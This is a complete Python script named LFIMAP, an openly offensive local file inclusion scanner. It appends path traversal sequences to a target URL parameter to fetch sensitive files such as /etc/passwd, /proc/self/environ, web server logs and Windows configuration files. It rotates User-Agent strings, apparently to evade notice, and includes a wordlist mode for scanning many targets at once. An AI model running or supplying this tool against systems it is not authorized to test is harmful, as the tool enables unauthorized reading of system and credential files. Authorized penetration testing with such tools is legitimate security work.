import requests
import sys
import os
import random

# ANSI Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Directory traversal levels (1 to 20)
levels = [ "../" * i for i in range(1, 21) ]

# Common Linux & Windows files to test
files = [
    "etc/passwd",
    "etc/hosts",
    "etc/issue",
    "proc/self/environ",
    "var/log/apache2/access.log",
    "windows/win.ini",
    "windows/system32/drivers/etc/hosts",
    "boot.ini",
    "windows/debug/NetSetup.log"
]

# Patterns to detect LFI success
patterns = ["root:x:", "[extensions]", "127.0.0.1"]

# Random User-Agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "curl/8.5.0",
    "Wget/1.21.4 (linux-gnu)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

# Clean Banner with colors
def banner():
    print(f"""{BLUE}{BOLD}
====================================================
                      LFIMAP
===================================================={RESET}
{GREEN}{BOLD}        Local File Inclusion Mapper (LFImap){RESET}
{YELLOW}     Created by Vipul Chavda{RESET}
{GREEN}     LinkedIn: {RESET}{BOLD}https://www.linkedin.com/in/vipul-chavda-974705302/{RESET}
{BLUE}===================================================={RESET}
""")

def scan_url(target):
    found = False
    payloads = [target + lvl + f for lvl in levels for f in files]
    total = len(payloads)

    print(f"\n{YELLOW}[+] Scanning: {target} ({total} payloads){RESET}")

    for count, url in enumerate(payloads, start=1):
        headers = {"User-Agent": random.choice(user_agents)}  # Random UA per request
        print(f"{CYAN}[{count}/{total}]{RESET} Testing: {url}")
        try:
            r = requests.get(url, headers=headers, timeout=5)
            for p in patterns:
                if p in r.text:
                    print(f"{GREEN}[VULNERABLE] {url} (matched '{p}'){RESET}")
                    found = True
                    break
        except:
            continue

    if not found:
        print(f"{RED}[-] Not Vulnerable: {target}{RESET}")
    else:
        print(f"{GREEN}[+] Vulnerability Scan Complete for {target}{RESET}")


def single_target_mode():
    target = input(f"{CYAN}Enter Target URL (e.g., http://site.com/page.php?file=): {RESET}")
    if not target.endswith("="):
        target += "="
    scan_url(target)


def wordlist_mode():
    wordlist = input(f"{CYAN}Enter path to wordlist file: {RESET}")
    if not os.path.exists(wordlist):
        print(f"{RED}[!] Wordlist not found!{RESET}")
        return

    with open(wordlist, "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    for url in urls:
        if not url.endswith("="):
            url += "="
        scan_url(url)


def main():
    banner()
    print(f"""{BLUE}
Choose Scan Mode:
1) Single Target
2) Multiple Targets (Wordlist)
{RESET}""")
    choice = input(f"{CYAN}Select option (1 or 2): {RESET}")

    if choice == "1":
        single_target_mode()
    elif choice == "2":
        wordlist_mode()
    else:
        print(f"{RED}Invalid choice! Exiting...{RESET}")


if __name__ == "__main__":
    main()
